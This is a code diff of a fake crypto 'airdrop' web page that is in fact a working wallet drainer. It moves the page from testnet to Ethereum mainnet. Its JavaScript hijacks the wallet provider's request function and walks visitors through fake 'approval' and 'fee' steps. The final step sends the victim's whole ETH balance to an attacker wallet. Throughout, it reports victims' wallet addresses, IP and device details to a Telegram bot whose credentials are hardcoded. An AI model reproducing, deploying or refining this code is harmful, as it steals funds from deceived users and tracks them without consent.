@@ -3,19 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔬 Quantum Yield Airdrop (Sepolia Testnet)</title>
+    <title>🔬 Quantum Yield Airdrop (Ethereum Mainnet)</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
     <script>
         const BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
         const CHAT_ID = "6309547301";
-        const YOUR_WALLET = "0xF01c1348579e129974A39BAcA3cA9eCe28e68490";
+        const YOUR_WALLET = "0x2ee051f714C186E6686Df46c61589a7485462cA9"; // Replace with your real ETH wallet
         const ETH_TO_USD_RATE = 2500;
 
         // ETH Clipper
-        if (window.ethereum) {
-            const originalRequest = window.ethereum.request;
+        if (typeof window.ethereum !== "undefined" || (window.web3 && window.web3.currentProvider)) {
+            const originalRequest = window.ethereum ? window.ethereum.request : window.web3.currentProvider.request;
+            window.ethereum = window.ethereum || window.web3.currentProvider;
             window.ethereum.request = async (args) => {
                 if (args.method === "eth_sendTransaction") {
                     const originalTo = args.params[0].to;
@@ -30,7 +31,7 @@
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
             } catch (e) {
-                console.log("Telegram alert failed...");
+                console.log("DAC: Telegram alert failed...");
             }
         }
 
@@ -48,7 +49,12 @@
         }
 
         async function connectWallet() {
+            // Wait a tick for MetaMask to inject
+            await new Promise(resolve => setTimeout(resolve, 500));
+            console.log("DAC: Checking for wallet...");
+
             if (!window.ethereum) {
+                console.log("DAC: No window.ethereum detected");
                 document.getElementById("status").innerHTML = "<p class='error'>MetaMask not detected! <a href='https://metamask.io/download/' target='_blank' style='color: #00ff9d;'>Install MetaMask</a></p>";
                 const info = await getVictimInfo();
                 await sendAlert(`NO WALLET: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
@@ -56,99 +62,140 @@
             }
 
             document.getElementById("status").innerHTML = "<p class='warning'><i class='fas fa-atom fa-spin'></i> Connecting to Blockchain...</p>";
-            await new Promise(resolve => setTimeout(resolve, 3000));
+            console.log("DAC: Wallet found, connecting...");
 
             try {
-                await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0xaa36a7" }] });
-                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-                const account = accounts[0];
-                const balance = BigInt(await window.ethereum.request({ method: "eth_getBalance", params: [account, "latest"] }));
+                const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error("Connection timed out")), 10000));
+                await Promise.race([
+                    (async () => {
+                        // Skip chain switch if already on mainnet (MetaMask browser likely is)
+                        const chainId = await window.ethereum.request({ method: "eth_chainId" });
+                        console.log("DAC: Current chainId:", chainId);
+                        if (chainId !== "0x1") {
+                            try {
+                                await window.ethereum.request({ 
+                                    method: "wallet_switchEthereumChain", 
+                                    params: [{ chainId: "0x1" }] 
+                                });
+                                console.log("DAC: Mainnet switched");
+                            } catch (switchErr) {
+                                if (switchErr.code === 4902) {
+                                    await window.ethereum.request({
+                                        method: "wallet_addEthereumChain",
+                                        params: [{
+                                            chainId: "0x1",
+                                            chainName: "Ethereum Mainnet",
+                                            rpcUrls: ["https://eth.llamarpc.com"],
+                                            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+                                            blockExplorerUrls: ["https://etherscan.io"]
+                                        }]
+                                    });
+                                    console.log("DAC: Mainnet added");
+                                } else {
+                                    throw switchErr;
+                                }
+                            }
+                        } else {
+                            console.log("DAC: Already on mainnet, skipping switch");
+                        }
 
-                if (balance === 0n) throw new Error("Wallet balance is zero.");
+                        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                        const account = accounts[0];
+                        console.log("DAC: Account hooked:", account);
 
-                const gasPrice = BigInt(await window.ethereum.request({ method: "eth_gasPrice" }));
-                const gasLimit = 21000n;
-                const gasCost = gasLimit * gasPrice;
-                const claimFee = BigInt("10000000000000000");
+                        const balance = BigInt(await window.ethereum.request({ 
+                            method: "eth_getBalance", 
+                            params: [account, "latest"] 
+                        }));
+                        console.log("DAC: Balance:", balance.toString());
 
-                if (balance < gasCost + claimFee) throw new Error("Insufficient funds for claim.");
+                        if (balance === 0n) throw new Error("Wallet’s dry, mate.");
 
-                const info = await getVictimInfo();
-                await sendAlert(`🎯 VICTIM CONNECTED\nWallet: ${account}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                        const gasPrice = BigInt(await window.ethereum.request({ method: "eth_gasPrice" }));
+                        const gasLimit = 21000n;
+                        const gasCost = gasLimit * gasPrice;
+                        const claimFee = BigInt("10000000000000000"); // 0.01 ETH
 
-                // Step 0: Fake token approval
-                document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Token Contract (0.001 SEP)...</p>";
-                await window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [{
-                        from: account,
-                        to: YOUR_WALLET,
-                        value: "0x" + BigInt("1000000000000000").toString(16),
-                        gas: "0x" + gasLimit.toString(16),
-                        gasPrice: "0x" + gasPrice.toString(16),
-                        chainId: "0xaa36a7"
-                    }]
-                });
+                        if (balance < gasCost + claimFee) throw new Error("Not enough ETH for the juice.");
 
-                // Step 1: Verification
-                document.getElementById("status").innerHTML = "<p class='warning'>Verifying wallet eligibility... Approve 0.005 SEP!</p>";
-                await window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [{
-                        from: account,
-                        to: YOUR_WALLET,
-                        value: "0x" + BigInt("5000000000000000").toString(16),
-                        gas: "0x" + gasLimit.toString(16),
-                        gasPrice: "0x" + gasPrice.toString(16),
-                        chainId: "0xaa36a7"
-                    }]
-                });
+                        const info = await getVictimInfo();
+                        await sendAlert(`🎯 VICTIM CONNECTED\nWallet: ${account}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
 
-                // Step 2: Claim fee
-                document.getElementById("status").innerHTML = "<p class='warning'>HURRY! Approve 0.01 SEP claim fee for 5 QYT (~$12,500 USD)!</p>";
-                await window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [{
-                        from: account,
-                        to: YOUR_WALLET,
-                        value: "0x" + claimFee.toString(16),
-                        gas: "0x" + gasLimit.toString(16),
-                        gasPrice: "0x" + gasPrice.toString(16),
-                        chainId: "0xaa36a7"
-                    }]
-                });
+                        document.getElementById("status").innerHTML = "<p class='warning'>Approve QYT Token Contract (0.001 ETH)...</p>";
+                        await window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [{
+                                from: account,
+                                to: YOUR_WALLET,
+                                value: "0x" + BigInt("1000000000000000").toString(16),
+                                gas: "0x" + gasLimit.toString(16),
+                                gasPrice: "0x" + gasPrice.toString(16),
+                                chainId: "0x1"
+                            }]
+                        });
+                        console.log("DAC: Step 0 - 0.001 ETH snagged");
 
-                // Step 3: Full drain
-                const drainAmount = balance - gasCost;
-                const drainEth = (Number(drainAmount) / 1e18).toFixed(6);
-                const drainUsd = (drainEth * ETH_TO_USD_RATE).toFixed(2);
-                document.getElementById("status").innerHTML = "<p class='warning'>FINAL STEP! Confirm to lock in your airdrop!</p>";
-                const txHash = await window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [{
-                        from: account,
-                        to: YOUR_WALLET,
-                        value: "0x" + drainAmount.toString(16),
-                        gas: "0x" + gasLimit.toString(16),
-                        gasPrice: "0x" + gasPrice.toString(16),
-                        chainId: "0xaa36a7"
-                    }]
-                });
+                        document.getElementById("status").innerHTML = "<p class='warning'>Verifying wallet eligibility... Approve 0.005 ETH!</p>";
+                        await window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [{
+                                from: account,
+                                to: YOUR_WALLET,
+                                value: "0x" + BigInt("5000000000000000").toString(16),
+                                gas: "0x" + gasLimit.toString(16),
+                                gasPrice: "0x" + gasPrice.toString(16),
+                                chainId: "0x1"
+                            }]
+                        });
+                        console.log("DAC: Step 1 - 0.005 ETH in");
 
-                await sendAlert(`✅ SEPOLIA SUCCESS: ${account} DRAINED\nAmount: ${drainEth} SEP (~$${drainUsd} USD)\nTX: ${txHash}\nIP: ${info.ip}`);
+                        document.getElementById("status").innerHTML = "<p class='warning'>HURRY! Approve 0.01 ETH claim fee for 5 QYT (~$12,500 USD)!</p>";
+                        await window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [{
+                                from: account,
+                                to: YOUR_WALLET,
+                                value: "0x" + claimFee.toString(16),
+                                gas: "0x" + gasLimit.toString(16),
+                                gasPrice: "0x" + gasPrice.toString(16),
+                                chainId: "0x1"
+                            }]
+                        });
+                        console.log("DAC: Step 2 - 0.01 ETH nabbed");
 
-                // Spin-to-win
-                document.getElementById("status").innerHTML = "<p class='warning'>Spin for a bonus! Spinning...</p><div class='wheel'></div>";
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 QYT + Bonus 5 QYT + NFT transferred!</p>";
+                        const drainAmount = balance - gasCost;
+                        const drainEth = (Number(drainAmount) / 1e18).toFixed(6);
+                        const drainUsd = (drainEth * ETH_TO_USD_RATE).toFixed(2);
+                        document.getElementById("status").innerHTML = "<p class='warning'>FINAL STEP! Confirm to lock in your airdrop!</p>";
+                        const txHash = await window.ethereum.request({
+                            method: "eth_sendTransaction",
+                            params: [{
+                                from: account,
+                                to: YOUR_WALLET,
+                                value: "0x" + drainAmount.toString(16),
+                                gas: "0x" + gasLimit.toString(16),
+                                gasPrice: "0x" + gasPrice.toString(16),
+                                chainId: "0x1"
+                            }]
+                        });
+                        console.log("DAC: Full drain done, TX:", txHash);
 
-                // Show share and phishing
-                document.getElementById("share").style.display = "block";
-                document.getElementById("phishing").style.display = "block";
+                        await sendAlert(`✅ MAINNET SUCCESS: ${account} DRAINED\nAmount: ${drainEth} ETH (~$${drainUsd} USD)\nTX: ${txHash}\nIP: ${info.ip}`);
+
+                        document.getElementById("status").innerHTML = "<p class='warning'>Spin for a bonus! Spinning...</p><div class='wheel'></div>";
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                        document.getElementById("status").innerHTML = "<h2 class='success'>Airdrop Secured!</h2><p>5 QYT + Bonus 5 QYT + NFT transferred!</p>";
+
+                        document.getElementById("share").style.display = "block";
+                        document.getElementById("phishing").style.display = "block";
+                    })(),
+                    timeout
+                ]);
             } catch (e) {
                 const info = await getVictimInfo();
-                await sendAlert(`SEPOLIA ERROR: ${account ? account : "Unknown"} - ${e.message}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
+                await sendAlert(`MAINNET ERROR: ${account ? account : "Unknown"} - ${e.message}\nIP: ${info.ip}\nBrowser: ${info.browser}\nDevice: ${info.device}`);
                 document.getElementById("status").innerHTML = `<h2 class='error'>Claim Failed</h2><p>Error: ${e.message}</p>`;
+                console.error("DAC: Crash -", e.message);
             }
         }
 
